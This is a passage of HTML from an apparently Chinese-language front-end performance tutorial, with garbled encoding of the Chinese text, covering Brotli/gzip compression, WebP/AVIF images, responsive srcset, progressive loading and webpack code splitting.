class="hljs-attr">minRatio</span>: <span class="hljs-number">0.8</span><br>    &#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompressionPlugin</span>(&#123;  <span class="hljs-comment">// brotli</span><br>      <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;[path][base].br&#x27;</span>,<br>      <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;brotliCompress&#x27;</span>,<br>      <span class="hljs-attr">threshold</span>: <span class="hljs-number">10240</span>,<br>      <span class="hljs-attr">minRatio</span>: <span class="hljs-number">0.8</span>,<br>      <span class="hljs-attr">compressionOptions</span>: &#123; <span class="hljs-attr">level</span>: <span class="hljs-number">11</span> &#125;<br>    &#125;)<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) nginx é…ç½®</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> / &#123;<br>  <span class="hljs-comment"># ä¼˜å…ˆè¿”å›é¢„å‹ç¼©çš„bræ–‡ä»¶</span><br>  <span class="hljs-attribute">brotli_static</span> <span class="hljs-literal">on</span>;<br>  <br>  <span class="hljs-comment"># è‹¥æ— bråˆ™è¿”å›gzip</span><br>  <span class="hljs-attribute">gzip_static</span> <span class="hljs-literal">on</span>;<br>  <br>  <span class="hljs-comment"># åŠ¨æ€å‹ç¼©å›é€€</span><br>  <span class="hljs-attribute">brotli</span> <span class="hljs-literal">on</span>;<br>  <span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¯·æ±‚å¤´åå•†æœºåˆ¶</strong></p><p>(1) å®¢æˆ·ç«¯å£°æ˜æ”¯æŒ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/main.js</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br  # å£°æ˜æ”¯æŒbr<br></code></pre></td></tr></table></figure><p>(2) æœåŠ¡ç«¯å“åº”</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"># è¿”å›Brotliå‹ç¼©<br><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Content-Encoding</span><span class="hljs-punctuation">: </span>br<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><br><span class="language-apache"><span class="hljs-comment"># è¿”å›Gzipå‹ç¼©</span></span><br><span class="language-apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK</span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Encoding: gzip</span><br><span class="language-apache"><span class="hljs-attribute">Vary</span>: Accept-Encoding</span><br></code></pre></td></tr></table></figure><p><strong>ç‰¹æ®Šæ³¨æ„äº‹é¡¹</strong></p><ul><li>åŠ¨æ€å†…å®¹å‹ç¼©ï¼šé¿å…å¯¹å·²å‹ç¼©æ ¼å¼ï¼ˆJPEG&#x2F;PNG&#x2F;WOFF2ï¼‰äºŒæ¬¡å‹ç¼©</li><li>CPUå¼€é”€æ§åˆ¶ï¼šåŠ¨æ€Brotliçº§åˆ«â‰¥7å¯èƒ½è§¦å‘CPUè¿‡è½½ï¼ˆç›‘æ§æœåŠ¡å™¨è´Ÿè½½ï¼‰</li><li>ç¼“å­˜ç©¿é€é£é™©ï¼šä¸åŒå‹ç¼©ç®—æ³•éœ€å•ç‹¬ç¼“å­˜ï¼šVary: Accept-Encoding å¿…é¡»è®¾ç½®</li></ul><h3 id="å›¾ç‰‡ä¼˜åŒ–ï¼šWebP-AVIFæ ¼å¼ã€å“åº”å¼å›¾ç‰‡ï¼ˆsrcsetï¼‰ã€æ¸è¿›åŠ è½½"><a href="#å›¾ç‰‡ä¼˜åŒ–ï¼šWebP-AVIFæ ¼å¼ã€å“åº”å¼å›¾ç‰‡ï¼ˆsrcsetï¼‰ã€æ¸è¿›åŠ è½½" class="headerlink" title="å›¾ç‰‡ä¼˜åŒ–ï¼šWebP&#x2F;AVIFæ ¼å¼ã€å“åº”å¼å›¾ç‰‡ï¼ˆsrcsetï¼‰ã€æ¸è¿›åŠ è½½"></a>å›¾ç‰‡ä¼˜åŒ–ï¼šWebP&#x2F;AVIFæ ¼å¼ã€å“åº”å¼å›¾ç‰‡ï¼ˆsrcsetï¼‰ã€æ¸è¿›åŠ è½½</h3><p><strong>ç°ä»£å›¾ç‰‡æ ¼å¼å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">JPEG</th><th align="left">PNG</th><th align="left">WebP</th><th align="left">AVIF</th></tr></thead><tbody><tr><td align="left">å‹ç¼©ç®—æ³•</td><td align="left">ç¦»æ•£ä½™å¼¦å˜æ¢</td><td align="left">æ— æŸDEFLATE</td><td align="left">VP8&#x2F;VP9å¸§å†…ç¼–ç </td><td align="left">AV1å¸§å†…ç¼–ç </td></tr><tr><td align="left">é€æ˜åº¦</td><td align="left">ä¸æ”¯æŒ</td><td align="left">æ”¯æŒ</td><td align="left">æ”¯æŒ</td><td align="left">æ”¯æŒ</td></tr><tr><td align="left">åŠ¨ç”»</td><td align="left">ä¸æ”¯æŒ</td><td align="left">æ”¯æŒï¼ˆAPNGï¼‰</td><td align="left">æ”¯æŒ</td><td align="left">æ”¯æŒ</td></tr><tr><td align="left">HDR&#x2F;å®½è‰²åŸŸ</td><td align="left">æœ‰é™æ”¯æŒ</td><td align="left">æœ‰é™æ”¯æŒ</td><td align="left">æ”¯æŒ</td><td align="left">å®Œæ•´æ”¯æŒï¼ˆ10bitï¼‰</td></tr></tbody></table><p><strong>WebP å®æ–½ç­–ç•¥</strong></p><p>(1) å…¼å®¹æ€§å¤„ç†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;picture&gt;<br>  &lt;!-- ä¼˜å…ˆAVIF --&gt;<br>  &lt;source srcset=&quot;image.avif&quot; type=&quot;image/avif&quot;&gt;<br>  <br>  &lt;!-- æ¬¡é€‰WebP --&gt;<br>  &lt;source srcset=&quot;image.webp&quot; type=&quot;image/webp&quot;&gt;<br>  <br>  &lt;!-- å…œåº•æ–¹æ¡ˆ --&gt;<br>  &lt;img src=&quot;image.jpg&quot; alt=&quot;ç¤ºä¾‹å›¾ç‰‡&quot;&gt;<br>&lt;/picture&gt;<br></code></pre></td></tr></table></figure><p>(2) è½¬æ¢å·¥å…·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># WebPè½¬æ¢ï¼ˆè´¨é‡80ï¼‰</span><br>cwebp -q 80 input.jpg -o output.webp<br><br><span class="hljs-comment"># æ‰¹é‡è½¬æ¢ï¼ˆimagemagickï¼‰</span><br>magick mogrify -format webp -quality 85 *.jpg<br></code></pre></td></tr></table></figure><p><strong>AVIF è¿›é˜¶ç‰¹æ€§</strong></p><p>æ ¸å¿ƒä¼˜åŠ¿ï¼š</p><ul><li>æè‡´å‹ç¼©ç‡ï¼šæ¯”WebPå†èŠ‚çœ20-30%</li><li>12bitè‰²æ·±ï¼šå®Œç¾è¿˜åŸHDRå†…å®¹</li><li>æ— æŸå‹ç¼©ï¼šå‹ç¼©ç‡æ¯”PNGé«˜50%</li></ul><p>éƒ¨ç½²é…ç½®ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginxæ·»åŠ MIMEç±»å‹</span><br><span class="hljs-section">types</span> &#123;<br>    image/<span class="hljs-attribute">avif</span>  avif;<br>&#125;<br></code></pre></td></tr></table></figure><p>è½¬æ¢å·¥å…·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># AVIFç¼–ç ï¼ˆCPUå¯†é›†å‹ï¼‰</span><br>avifenc --speed 0 --quality 50 input.jpg output.avif<br></code></pre></td></tr></table></figure><p><strong>å“åº”å¼å›¾ç‰‡ï¼ˆsrcsetï¼‰</strong></p><p>è®¾å¤‡é€‚é…æ–¹æ¡ˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;img srcset=&quot;<br>  small.jpg  480w,<br>  medium.jpg 768w,<br>  large.jpg  1200w&quot;<br> sizes=&quot;(max-width: 600px) 480px,<br>        (max-width: 1024px) 768px,<br>        1200px&quot;<br> src=&quot;fallback.jpg&quot;<br> alt=&quot;å“åº”å¼å›¾ç‰‡ç¤ºä¾‹&quot;&gt;<br></code></pre></td></tr></table></figure><p>sizes è®¡ç®—è§„åˆ™ï¼š</p><pre class="mermaid">graph TD    A[è§†å£å®½åº¦] --> B{åŒ¹é…mediaæ¡ä»¶}    B -->|600pxâ†“| C[ä½¿ç”¨480px]    B -->|601-1024px| D[ä½¿ç”¨768px]    B -->|1025pxâ†‘| E[ä½¿ç”¨1200px]</pre><p>åƒç´ å¯†åº¦é€‚é…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 2xé«˜æ¸…å±é€‚é… --&gt;<br>&lt;img srcset=&quot;<br>  image@1x.jpg 1x,<br>  image@2x.jpg 2x,<br>  image@3x.jpg 3x&quot;<br> src=&quot;image@1x.jpg&quot; <br> alt=&quot;é«˜DPIé€‚é…&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>æ¸è¿›åŠ è½½ï¼ˆProgressive Loadingï¼‰</strong></p><p>å®ç°æ–¹æ¡ˆå¯¹æ¯”ï¼š</p><table><thead><tr><th align="left">æŠ€æœ¯</th><th align="left">å®ç°æ–¹å¼</th><th align="left">ç”¨æˆ·ä½“éªŒ</th></tr></thead><tbody><tr><td align="left">åŸºçº¿JPEG</td><td align="left">é¡ºåºåŠ è½½</td><td align="left">ä»ä¸Šåˆ°ä¸‹æ‰«æ</td></tr><tr><td align="left">æ¸è¿›å¼JPEG</td><td align="left">å¤šæ¬¡æ‰«ææ¸²æŸ“</td><td align="left">æ¨¡ç³Šâ†’æ¸…æ™°</td></tr><tr><td align="left">WebPæ¸è¿›</td><td align="left">å†…ç½®æ¸è¿›åŠ è½½</td><td align="left">åŒJPEGä½†æ›´å¿«</td></tr><tr><td align="left">LQIPå ä½</td><td align="left">åŠ è½½è¶…å°é¢„è§ˆå›¾ï¼ˆ20pxå®½ï¼‰</td><td align="left">å…ˆæ˜¾ç¤ºæ¨¡ç³Šé¢„è§ˆ</td></tr></tbody></table><p>ç”Ÿæˆæ¸è¿›JPEGï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ImageMagickè½¬æ¢</span><br>convert input.jpg -interlace Plane progressive.jpg<br><br><span class="hljs-comment"># MozJPEGå·¥å…·</span><br>cjpeg -progressive -quality 85 input.png &gt; output.jpg<br></code></pre></td></tr></table></figure><p>ç°ä»£å®ç°æ¡†æ¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs HTML">// ä½¿ç”¨loading=&quot;lazy&quot; + æ¨¡ç³Šå ä½<br>&lt;img <br>  src=&quot;tiny-preview.jpg&quot; <br>  data-src=&quot;full.jpg&quot; <br>  loading=&quot;lazy&quot;<br>  style=&quot;filter: blur(5px)&quot;<br>  onload=&quot;this.style.filter=&#x27;none&#x27;&quot;<br>&gt;<br></code></pre></td></tr></table></figure><p><strong>å›¾ç‰‡æ ¼å¼é€‰æ‹©å†³ç­–ç­–ç•¥</strong></p><pre class="mermaid">graph TD    A[å›¾ç‰‡ç±»å‹] --> B{éœ€è¦åŠ¨ç”»?}    B -->|æ˜¯| C[WebP/AVIF]    B -->|å¦| D{éœ€è¦é€æ˜åº¦?}    D -->|æ˜¯| E{éœ€è¦æ— æŸ?}    E -->|æ˜¯| F[PNG/AVIF]    E -->|å¦| G[WebP/AVIF]    D -->|å¦| H{é«˜ç”»è´¨è¦æ±‚?}    H -->|æ˜¯| I[AVIF]    H -->|å¦| J[WebP]</pre><p><strong>æµè§ˆå™¨å…¼å®¹æ€§</strong></p><table><thead><tr><th align="left">æµè§ˆå™¨</th><th align="left">WebPæ”¯æŒ</th><th align="left">AVIFæ”¯æŒ</th><th align="left">å“åº”å¼å›¾ç‰‡</th></tr></thead><tbody><tr><td align="left">Chrome</td><td align="left">âœ… 32+</td><td align="left">âœ… 85+</td><td align="left">âœ… å®Œå…¨</td></tr><tr><td align="left">Firefox</td><td align="left">âœ… 65+</td><td align="left">âœ… 86+</td><td align="left">âœ… å®Œå…¨</td></tr><tr><td align="left">Safari</td><td align="left">âœ… 14+</td><td align="left">âœ… 16.1+</td><td align="left">âœ… å®Œå…¨</td></tr><tr><td align="left">Edge</td><td align="left">âœ… 18+</td><td align="left">âœ… 85+</td><td align="left">âœ… å®Œå…¨</td></tr><tr><td align="left">IE 11</td><td align="left">âŒ</td><td align="left">âŒ</td><td align="left">âŒ</td></tr></tbody></table><h3 id="ä»£ç æ‹†åˆ†ï¼šåŠ¨æ€import-ã€Webpack-SplitChunks"><a href="#ä»£ç æ‹†åˆ†ï¼šåŠ¨æ€import-ã€Webpack-SplitChunks" class="headerlink" title="ä»£ç æ‹†åˆ†ï¼šåŠ¨æ€import()ã€Webpack SplitChunks"></a>ä»£ç æ‹†åˆ†ï¼šåŠ¨æ€import()ã€Webpack SplitChunks</h3><p><strong>ä»£ç æ‹†åˆ†æ ¸å¿ƒç›®æ ‡</strong></p><ul><li>å‡å°‘åˆå§‹è´Ÿè½½ï¼šä»…åŠ è½½å½“å‰è·¯ç”±å¿…éœ€ä»£ç </li><li>æå‡äº¤äº’å“åº”ï¼šå»¶è¿ŸåŠ è½½éå…³é”®åŠŸèƒ½</li><li>ç¼“å­˜ä¼˜åŒ–ï¼šåˆ†ç¦»é¢‘ç¹å˜æ›´ä¸ç¨³å®šä»£ç </li></ul><p><strong>åŠ¨æ€ import() å®ç°æœºåˆ¶</strong></p><p>åŸºæœ¬è¯­æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é™æ€å¯¼å…¥ï¼ˆä¼ ç»Ÿæ–¹å¼ï¼‰</span><br><span class="hljs-keyword">import</span> utils <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./utils&#x27;</span>; <br><br><span class="hljs-comment">// åŠ¨æ€å¯¼å…¥ï¼ˆè¿”å›Promiseï¼‰</span><br><span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./utils&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">module</span> =&gt;</span> &#123;<br>  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">doSomething</span>();<br>&#125;);<br></code></pre></td></tr></table></figure><p>React ç»„ä»¶çº§æ‹†åˆ†ï¼š</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProductList</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./ProductList&#x27;</span>));<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Spinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ProductList</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>Vue å¼‚æ­¥ç»„ä»¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">AdminPanel</span> = (<span class="hljs-params"></span>) =&gt; (&#123;<br>  <span class="hljs-attr">component</span>: <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./AdminPanel.vue&#x27;</span>),<br>  <span class="hljs-attr">loading</span>: <span class="hljs-title class_">LoadingComponent</span>,<br>  <span class="hljs-attr">delay</span>: <span class="hljs-number">200</span> <span class="hljs-comment">// å»¶è¿Ÿæ˜¾ç¤ºloading</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Webpack SplitChunks é«˜çº§é…ç½®</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">optimization</span>: &#123;<br>    <span class="hljs-attr">splitChunks</span>: &#123;<br>      <span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;all&#x27;</span>,<br>      <span class="hljs-attr">cacheGroups</span>: &#123;<br>        <span class="hljs-attr">vendors</span>: &#123;<br>          <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/]/</span>,<br>          <span class="hljs-attr">priority</span>: -<span class="hljs-number">10</span><br>        &#125;,<br>        <span class="hljs-attr">default</span>: &#123;<br>          <span class="hljs-attr">minChunks</span>: <span class="hljs-number">2</span>,<br>          <span class="hljs-attr">priority</span>: -<span class="hljs-number">20</span>,<br>          <span class="hljs-attr">reuseExistingChunk</span>: <span class="hljs-literal">true</span><br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å…³é”®é…ç½®å‚æ•°ï¼š</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">ç±»å‹</th><th align="left">åŠŸèƒ½</th><th align="left">æ¨èå€¼</th></tr></thead><tbody><tr><td align="left">minSize</td><td align="left">number</td><td align="left">ç”Ÿæˆå—çš„æœ€å°å°ºå¯¸</td><td align="left">20000 (20KB)</td></tr><tr><td align="left">maxSize</td><td align="left">number</td><td align="left">å°è¯•æ‹†åˆ†çš„æœ€å¤§å°ºå¯¸</td><td align="left">0 (æ— é™åˆ¶)</td></tr><tr><td align="left">minChunks</td><td align="left">number</td><td align="left">è¢«å¼•ç”¨æ¬¡æ•°é˜ˆå€¼</td><td align="left">2</td></tr><tr><td align="left">chunks</td><td align="left">string</td><td align="left">é€‰æ‹©å—ç±»å‹ï¼ˆall&#x2F;async&#x2F;initialï¼‰</td><td align="left">â€˜allâ€™</td></tr><tr><td align="left">automaticNameDelimiter</td><td align="left">stringè‡ªåŠ¨å‘½ååˆ†éš”ç¬¦</td><td align="left">â€˜~â€™</td><td align="left"></td></tr></tbody></table><p><strong>æ‹†åˆ†é…ç½®ç­–ç•¥</strong></p><p>(1) ç¬¬ä¸‰æ–¹åº“åˆ†ç¦»</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">cacheGroups</span>: &#123;<br>  <span class="hljs-attr">reactVendor</span>: &#123;<br>    <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/](react|react-dom)[\\/]/</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;react-vendor&#x27;</span>,<br>    <span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;all&#x27;</span><br>  &#125;,<br>  <span class="hljs-attr">utilityVendor</span>: &#123;<br>    <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/](lodash|moment)[\\/]/</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;utility-vendor&#x27;</span>,<br>    <span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;all&#x27;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) ä¸šåŠ¡æ¨¡å—åˆ†ç¦»</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">cacheGroups</span>: &#123;<br>  <span class="hljs-attr">userModule</span>: &#123;<br>    <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]src[\\/]modules[\\/]user[\\/]/</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;user-module&#x27;</span>,<br>    <span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;async&#x27;</span> <span class="hljs-comment">// ä»…å¼‚æ­¥åŠ è½½</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) å…¬å…±æ¨¡å—æå–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">cacheGroups</span>: &#123;<br>  <span class="hljs-attr">common</span>: &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;common&#x27;</span>,<br>    <span class="hljs-attr">minChunks</span>: <span class="hljs-number">2</span>, <span class="hljs-comment">// è¢«2ä¸ªä»¥ä¸Šå…¥å£å¼•ç”¨</span><br>    <span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;initial&#x27;</span>,<br>    <span class="hljs-attr">priority</span>: -<span class="hljs-number">20</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è·¯ç”±çº§ä»£ç æ‹†åˆ†</strong></p><p>(1) React Routerå®ç°</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> &#123; lazy, <span class="hljs-title class_">Suspense</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Home</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./routes/Home&#x27;</span>));<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">About</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./routes/About&#x27;</span>));<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">FullPageSpinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Home</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/about&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">About</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) Vue Router å®ç°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> routes = [<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>,<br>    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./views/Home.vue&#x27;</span>)<br>  &#125;,<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/product&#x27;</span>,<br>    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;product&quot; */</span> <span class="hljs-string">&#x27;./views/Product.vue&#x27;</span>)<br>  &#125;<br>];<br></code></pre></td></tr></table></figure><p><strong>é¢„åŠ è½½ - webpack é­”æ³•æ³¨é‡Š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å¸¸è§„åŠ è½½</span><br><span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;chart&quot; */</span> <span class="hljs-string">&#x27;./Chart&#x27;</span>);<br><br><span class="hljs-comment">// ç©ºé—²æ—¶é¢„åŠ è½½</span><br><span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: 